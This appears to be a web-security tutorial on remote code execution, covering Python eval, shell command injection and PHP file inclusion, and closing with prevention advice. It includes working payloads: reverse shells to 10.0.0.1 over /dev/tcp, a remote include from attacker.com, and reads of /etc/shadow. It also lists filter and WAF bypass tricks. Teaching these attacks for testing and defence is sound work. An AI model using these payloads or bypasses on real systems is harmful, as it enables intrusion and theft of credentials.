# RCE

User
 input transforms into executable codes when code injection happens. The
 eval() function in Python constitutes a standard instance of this 
problem.

```
def calculate(input):
     return eval("{}".format(input))
```

If a user submits:

```
GET /calculator?calc="__import__('os').system('ls')"
```

The server executes `os.system('ls')`, revealing system files. More critically, an attacker can establish a reverse shell:

```
GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
```

Command injection exploits unsanitized user input in system commands. If an application executes `wget` to download a file:

```
import os
def download(url):
    os.system("wget -O- {}".format(url))
```

An attacker can append a malicious command using a semicolon (`;`):

```
GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

File inclusion vulnerabilities allow attackers to execute remote or local files.

- **Remote File Inclusion (RFI):** If an application includes files dynamically:

```
<?php
$file = $_GET["page"];
include $file;
?>
```

An attacker can host a malicious PHP script:

```
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

- **Local File Inclusion (LFI):** If the application references local files:

```
<?php
$file = $_GET["page"];
include "lang/".$file;
?>
```

An attacker can escape directories and execute malicious files:

```
http://example.com/?page=../uploads/USERNAME/malicious.php
```

## Exploit Detection

- **Classic RCE:** Execute `whoami` to confirm execution:

```
GET /vulnerable-endpoint?cmd=whoami
```

- **Blind RCE:** Use time-based validation with `sleep`:

```
GET /vulnerable-endpoint?cmd=sleep+5
```

A delayed response confirms vulnerability.

By
 securing input validation, restricting execution privileges, and 
leveraging security tools, RCE risks can be significantly mitigated.

**Bypassing RCE Protection:** Use different string representations:

- `cat /etc/shadow`
- `cat "/e"tc'/shadow'`
- `cat /etc/sh*dow`
- `cat /etc/sha``dow`
- `cat /etc/sha$()dow`
- `cat /etc/sha${}dow`

## PHP-Based Bypasses

- Concatenate function names: `('sys'.'tem')('cat /etc/shadow');`
- Insert comments: `system/**/('ls');`
- Use hex encoding: `'\x73\x79\x73\x74\x65\x6d'('ls');`

## Python-Based Bypasses

- `__import__('os').system('cat /etc/shadow')`
- `__import__('o'+'s').system('cat /etc/shadow')`
- `__import__('\x6f\x73').system('cat /etc/shadow')`

## Splitting Payloads to Evade WAF

- Send parameters separately: `GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"`
- The server concatenates values into:`"__import__('os').system('ls')"`

## Other Bypasses

- The security bypass methods consist of Hex-encoding combined with URL encoding followed by double URL encoding.
- Case variations (uppercase/lowercase).
- Null bytes, newline characters, and escape characters.
- The testing of blocked payloads should be performed to determine possible workaround methods.

## Finding Your First RCE

1. Technicians should determine where users enter information through URL parameters,
HTTP headers, body parameters as well as file upload features.
2. Submit test payloads.
3. If blocked, apply protection-bypass techniques.
4. Confirm vulnerability using harmless commands.
5. The system administrator should prevent both reading of important files and modifying essential system files.
6. Create an RCE report that includes all required steps to reproduce the issue.

## Prevention

- User input must remain prohibited when executed through eval() and system() functions along with comparable functions.
- File inclusion must be restricted to the approval list while prohibiting all forms of remote file inclusion.
- The application needs to validate user input through robust input sanitization while implementing allowlists.
- The practice of least privilege should be enforced which limits the permissions of applications.
- WAF system provides Web Application Firewall capabilities to block exploit attempts.
- The update of software helps protect software against new risks that dependencies create.